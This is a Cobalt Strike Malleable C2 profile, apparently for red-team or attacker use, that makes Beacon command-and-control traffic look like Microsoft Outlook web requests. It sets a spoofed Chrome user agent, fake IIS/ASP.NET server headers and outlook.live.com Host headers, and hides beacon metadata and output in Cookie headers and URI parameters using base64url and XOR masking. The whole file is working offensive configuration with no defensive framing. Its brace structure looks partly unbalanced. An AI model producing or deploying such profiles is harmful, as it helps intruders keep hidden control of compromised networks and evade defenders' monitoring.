set sample_name "outlook.profile";
set sleeptime "30000";
set jitter "50";
set host_stage "false";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36";

#HTTP/S Global Response Header Block
http-config {
    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        
    header "Server" "Microsoft-IIS/10.0";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Cache-Control" "no-store,no-cache";
    header "Connection" "keep-alive";
    header "X-Powered-By" "ASP.NET";

#GET settings
http-get {
    set uri "/login /owa /mailbox";

    client {
        header "Host" "outlook.live.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close"; }
    
    metadata {
        #base64;                     # Base64 Encode
        base64url;                  # URL-safe Base64 Encode
        mask;                       # XOR mask w/ random key
        #netbios;                    # NetBIOS Encode 'a'
        #netbiosu;                   # NetBIOS Encode 'A'
        prepend "user=";            # Prepend "string"
        #append ".asp";              # Append "string"

### Termination Statements
        parameter "key";            # Store data in a URI parameter
        header "Cookie";            # Store data in an HTTP header
        }

    server {
        header "Server" "Apache"; # headers will be pulled from the http-config block, or manually add your preferences below:

        output {
            #base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            #netbios;                        # NetBIOS Encode 'a'
            #netbiosu;                       # NetBIOS Encode 'A'
            prepend "user=";                # Prepend "string"
            #append ".asp";                  # Append "string"
            print; } } } # Server block MUST be terminated with "print"

### HTTP-POST Block
http-post {
    set uri "/Login /OWA /Mailbox";    
      
    set verb POST; # Use "GET" for GET Only C2

    client {
        header "Host" "outlook.live.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        id {                                    
            #base64;                    # Base64 Encode
            base64url;                 # URL-safe Base64 Encode
            mask;                      # XOR mask w/ random key
            #netbios;                   # NetBIOS Encode 'a'
            #netbiosu;                  # NetBIOS Encode 'A'
            prepend "user=";           # Prepend "string"
            #append ".asp";             # Append "string"
            parameter "id";            # Add Beacon ID in parameter
            #header "ID-Header"; }      # Add Beacon ID in header
        

        output {
            #base64;                  # Base64 Encode
            base64url;               # URL-safe Base64 Encode
            mask;                    # XOR mask w/ random key
            #netbios;                 # NetBIOS Encode 'a'
            #netbiosu;                # NetBIOS Encode 'A'
            prepend "user=";         # Prepend "string"
            #append "asp";            # Append "string"
            #parameter "key";         # Store data in a URI parameter
            header "Cookie";         # Store data in an HTTP header
            #uri-append; } }          # Append to URI

    server {
        header "Server" "Apache"; # headers will be pulled from the http-config block, or manually add your preferences below:

        output {
            #base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            #netbios;                        # NetBIOS Encode 'a'
            #netbiosu;                       # NetBIOS Encode 'A'
            prepend "user=";                # Prepend "string"
            #append ".asp";                  # Append "string"
            print; } } } # Server block MUST be terminated with "print"
